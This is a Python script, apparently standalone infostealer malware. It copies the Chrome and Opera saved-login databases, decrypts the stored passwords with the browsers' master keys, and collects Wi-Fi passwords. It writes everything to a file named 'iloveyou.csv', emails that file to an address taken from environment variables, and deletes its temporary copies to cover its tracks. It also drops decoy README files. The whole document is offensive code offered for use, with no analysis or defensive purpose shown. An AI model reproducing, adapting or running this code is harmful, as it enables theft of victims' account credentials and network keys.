from vbscript import Vbscript
from tkinter import messagebox
from lib.connect import checkNetwork
import sqlite3, shutil

from dotenv import load_dotenv
import os, sys
load_dotenv()

if checkNetwork() != True:
    messagebox.showinfo('HTTPSConnectionPool Error', message='Connect Network Error')
    sys.exit()
    
operadb = "operadb.db"
chromedb = 'chrome.db'

path_login = r'AppData\Local\Google\Chrome\User Data\default\Login Data'

if __name__ == '__main__':
    FROM_EMAIL = os.getenv('FROM_EMAIL')
    FROM_PASSWORD = os.getenv('FROM_PASSWORD')
    TO_EMAIL = os.getenv('TO_EMAIL')
    
    vb = Vbscript(
        from_email=FROM_EMAIL,
        from_password=FROM_PASSWORD,
        to_email=TO_EMAIL,
        )
    text = f'{"-"*7} readme.txt {"-"*7}\n\n \t LET ME \n\n{"-"*26}'
    FOLDER = 'README'
    if not os.path.exists(FOLDER):
        os.mkdir(FOLDER)

    for txt in range(1, 11):
        file = open(f'{FOLDER}/README{txt}.txt', 'w')
        file.write(text)
        file.close()

    vb.Get_Wifi_Password()
    key_master = vb.getPassword()
    login_db = os.environ['userprofile'] + os.sep + path_login
    shutil.copy2(login_db, chromedb)
    connect = sqlite3.connect(chromedb)
    cursor = connect.cursor()

    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    for item in cursor.fetchall():
        url = item[0]
        username = item[1]
        encrypted_password = item[2]
        decrypted_password = vb.decryptPassword(encrypted_password, key_master)
        save = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n\n"
        with open('iloveyou.csv', 'a') as passwords:
            passwords.write(save)

    # opera    
    try:
        key = vb.getEncryptionKey()
        try:
            db_path = os.path.join(os.environ["userprofile"],"AppData", "Roaming", "Opera Software", "Opera Stable", "Login Data")
        except:
            db_path = os.path.join(os.environ["userprofile"],"AppData", "Roaming", "Opera Software", "Opera GX Stable", "Login Data")
        file = open("iloveyou.csv", "a")
        file.write("\n\n============> NAVEGADOR OPERA <============\n")
        shutil.copyfile(db_path, operadb)
        db = sqlite3.connect(operadb)
        cursorOP = db.cursor()
        cursorOP.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

        for row in cursorOP.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = vb.decryptPasswordOP(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            if username or password:
                file.write(f"\nURL: {origin_url}\n")
                file.write(f"URL: {action_url}\n")
                file.write(f"User: {username}\n")
                file.write(f"Senha: {password}\n")
            else:
                continue
            if date_created != 86400000000 and date_created:
                file.write(f"Data: {str(vb.getChrome(date_created))}\n")
            if date_last_used != 86400000000 and date_last_used:
                file.write(f"Última vez logado: {str(vb.getChrome(date_last_used))}\n")
            file.write("="*55)
        cursorOP.close()
        db.close()
        file.close()
    except:
        pass

    vb.Send_Email()
    cursor.close()
    connect.close()
try:
    if os.path.exists(chromedb):
        os.remove(chromedb)
    if os.path.exists(operadb):
        os.remove(operadb)
    os.remove('iloveyou.csv')
except: ...